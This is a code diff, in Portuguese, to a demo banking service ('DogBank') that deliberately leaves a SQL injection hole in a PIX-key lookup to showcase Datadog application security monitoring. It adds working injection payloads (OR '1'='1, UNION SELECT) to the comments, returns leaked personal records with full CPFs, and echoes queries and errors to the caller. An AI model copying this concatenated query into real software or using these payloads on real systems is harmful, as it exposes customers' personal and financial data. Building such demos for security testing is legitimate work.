@@ -245,6 +245,17 @@ public class TransactionService {
     
     /**
      * ⚠️⚠️⚠️ VULNERÁVEL A SQL INJECTION - PROPOSITAL PARA DEMO DATADOG ASM ⚠️⚠️⚠️
+     * 
+     * Exemplos de SQL Injection que funcionam:
+     * 
+     * 1. Bypass (retorna todos os usuários):
+     *    GET /api/transactions/validate-pix-key?pixKey=' OR '1'='1
+     * 
+     * 2. Buscar por outro campo:
+     *    GET /api/transactions/validate-pix-key?pixKey=' OR email='pedro.silva@dogbank.com' --
+     * 
+     * 3. UNION SELECT (6 colunas):
+     *    GET /api/transactions/validate-pix-key?pixKey=' UNION SELECT nome, email, cpf, saldo::text, banco, chave_pix FROM usuarios u JOIN contas c ON u.id=c.usuario_id--
      */
     @Transactional(readOnly = true)
     public Map<String, Object> getBalanceByPixKeyVulnerable(String pixKey) {
@@ -256,12 +267,13 @@ public class TransactionService {
         MDC.put("endpoint", "/api/transactions/validate-pix-key");
         
         try {
+            // ⚠️ VULNERÁVEL: Concatenação direta de string sem sanitização
             String sql = "SELECT u.nome, u.email, u.cpf, c.saldo, c.banco, u.chave_pix " +
                          "FROM usuarios u " +
                          "JOIN contas c ON u.id = c.usuario_id " +
                          "WHERE u.chave_pix = '" + pixKey + "'";
             
-            log.info("📝 [SQL QUERY]: {}", sql);
+            log.info("📝 [SQL QUERY EXECUTADA]: {}", sql);
             
             @SuppressWarnings("unchecked")
             javax.persistence.Query query = entityManager.createNativeQuery(sql);
@@ -269,22 +281,51 @@ public class TransactionService {
             
             if (results.isEmpty()) {
                 log.warn("❌ Nenhum resultado encontrado para: {}", pixKey);
-                return Map.of(
-                    "valid", false,
-                    "message", "Chave PIX não encontrada"
-                );
+                Map<String, Object> emptyResponse = new HashMap<>();
+                emptyResponse.put("valid", false);
+                emptyResponse.put("message", "Chave PIX não encontrada");
+                emptyResponse.put("query_executed", sql);
+                return emptyResponse;
             }
             
+            // Se retornou múltiplos resultados (SQL Injection bem sucedido!)
+            if (results.size() > 1) {
+                log.error("🚨 [SQL INJECTION DETECTADO] Query retornou {} registros!", results.size());
+                
+                Map<String, Object> response = new HashMap<>();
+                response.put("valid", true);
+                response.put("sql_injection_detected", true);
+                response.put("records_leaked", results.size());
+                response.put("query_executed", sql);
+                
+                // Retorna TODOS os dados vazados (para demonstração)
+                List<Map<String, Object>> leakedData = new ArrayList<>();
+                for (Object[] row : results) {
+                    Map<String, Object> userData = new HashMap<>();
+                    userData.put("nome", row[0] != null ? row[0].toString() : "N/A");
+                    userData.put("email", row[1] != null ? row[1].toString() : "N/A");
+                    userData.put("cpf", row[2] != null ? row[2].toString() : "N/A"); // CPF completo vazado!
+                    userData.put("saldo", row[3] != null ? "R$ " + row[3].toString() : "R$ 0,00");
+                    userData.put("banco", row[4] != null ? row[4].toString() : "DogBank");
+                    userData.put("chave_pix", row[5] != null ? row[5].toString() : "N/A");
+                    leakedData.add(userData);
+                }
+                response.put("leaked_data", leakedData);
+                
+                return response;
+            }
+            
+            // Resultado único (comportamento normal ou injection direcionado)
             Object[] row = results.get(0);
             
             Map<String, Object> response = new HashMap<>();
             response.put("valid", true);
-            response.put("nome", row[0] != null ? row[0] : "N/A");
-            response.put("email", row[1] != null ? row[1] : "N/A");
+            response.put("nome", row[0] != null ? row[0].toString() : "N/A");
+            response.put("email", row[1] != null ? row[1].toString() : "N/A");
             response.put("cpf", row[2] != null ? maskCpf(row[2].toString()) : "N/A");
-            response.put("saldo", row[3] != null ? "R$ " + row[3] : "R$ 0,00");
-            response.put("banco", row[4] != null ? row[4] : "DogBank");
-            response.put("chave_pix", row[5] != null ? row[5] : "N/A");
+            response.put("saldo", row[3] != null ? "R$ " + row[3].toString() : "R$ 0,00");
+            response.put("banco", row[4] != null ? row[4].toString() : "DogBank");
+            response.put("chave_pix", row[5] != null ? row[5].toString() : "N/A");
             
             log.info("✅ Dados encontrados para: {}", row[0]);
             
@@ -298,6 +339,7 @@ public class TransactionService {
             errorResponse.put("valid", false);
             errorResponse.put("error", "Erro de SQL: " + e.getMessage());
             errorResponse.put("sql_error", true);
+            errorResponse.put("input_received", pixKey);
             
             return errorResponse;
         } finally {
